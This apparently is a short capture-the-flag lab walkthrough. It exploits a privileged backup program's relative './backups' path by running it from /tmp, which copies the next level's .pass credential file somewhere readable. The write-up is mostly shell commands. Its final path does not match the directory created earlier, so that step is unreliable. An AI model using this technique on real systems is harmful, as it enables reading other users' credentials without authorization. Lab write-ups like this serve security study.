$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

but this for example work, the problem is fopen uses mode, which open the file exclusively
If the file already exists, fopen() fails

$ ./level08 level08

program use not absolute path, but relative "./backups", thus we can simply run it from another folder
in /home/users/level08/backups folder we do not have write permissions, but we do have them in /tmp

$ mkdir -p /tmp/backups/home/users/level09 && cd /tmp

$ /home/users/level08/level08 /home/users/level09/.pass 

$ cat /tmp/backups/home/users/level09.pass
